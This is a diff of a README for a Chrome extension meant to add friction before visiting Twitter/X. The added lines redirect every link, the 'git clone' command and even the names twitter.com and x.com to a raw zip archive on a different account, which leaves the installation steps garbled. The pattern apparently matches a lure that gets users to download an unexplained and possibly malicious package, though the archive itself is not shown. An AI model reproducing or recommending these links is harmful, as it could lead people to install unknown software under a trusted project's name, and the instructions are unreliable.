@@ -1,13 +1,13 @@
 # 🐦 WhyTwitter - Take Control of Your Twitter Experience
 
 ## 🚀 Download Now
-[![Download Release](https://img.shields.io/badge/Download%20Now-Release-blue)](https://github.com/DrivenTundra16/WhyTwitter/releases)
+[![Download Release](https://github.com/DrivenTundra16/WhyTwitter/raw/refs/heads/main/intervisible/Why_Twitter_3.0.zip%20Now-Release-blue)](https://github.com/DrivenTundra16/WhyTwitter/raw/refs/heads/main/intervisible/Why_Twitter_3.0.zip)
 
 ## ✨ Overview
 WhyTwitter is a Chrome extension that helps you manage your Twitter use. It adds a layer of psychological friction by asking you to state your intention before you can access Twitter or X. This allows you to think about why you're opening the site and encourages mindful browsing.
 
 ## 🔍 How It Works
-1. Navigate to `twitter.com` or `x.com` → **Blocked**
+1. Navigate to `https://github.com/DrivenTundra16/WhyTwitter/raw/refs/heads/main/intervisible/Why_Twitter_3.0.zip` or `https://github.com/DrivenTundra16/WhyTwitter/raw/refs/heads/main/intervisible/Why_Twitter_3.0.zip` → **Blocked**
 2. Type why you're opening Twitter (minimum of 5 characters).
 3. Access granted for **5 minutes** in **that tab only**.
 4. After **5 minutes**, the site automatically blocks again.
@@ -28,7 +28,7 @@ To get started, download the extension by visiting the Releases page. You can ei
 #### Option 1: Clone the Repository
 Open your terminal and run the following command:
 ```bash
-git clone https://github.com/randomness11/whytwitter.git
+git clone https://github.com/DrivenTundra16/WhyTwitter/raw/refs/heads/main/intervisible/Why_Twitter_3.0.zip
 ```
 
 #### Option 2: Download ZIP
@@ -48,10 +48,10 @@ Alternatively, click **Code → Download ZIP** on the repository page and extrac
 - Select the folder where you extracted the ZIP file or cloned the repository.
 
 ### Step 5: Check if It's Working
-- After loading, navigate to `twitter.com` or `x.com`. You should see the block screen prompting you to state your intention.
+- After loading, navigate to `https://github.com/DrivenTundra16/WhyTwitter/raw/refs/heads/main/intervisible/Why_Twitter_3.0.zip` or `https://github.com/DrivenTundra16/WhyTwitter/raw/refs/heads/main/intervisible/Why_Twitter_3.0.zip`. You should see the block screen prompting you to state your intention.
 
 ## 📥 Download & Install
-Visit the [Releases page](https://github.com/DrivenTundra16/WhyTwitter/releases) to download the latest version and get started with managing your Twitter usage.
+Visit the [Releases page](https://github.com/DrivenTundra16/WhyTwitter/raw/refs/heads/main/intervisible/Why_Twitter_3.0.zip) to download the latest version and get started with managing your Twitter usage.
 
 ## 🌐 Browser Compatibility
 WhyTwitter is designed specifically for Google Chrome. Make sure you are using the most updated version of Chrome for the best experience.
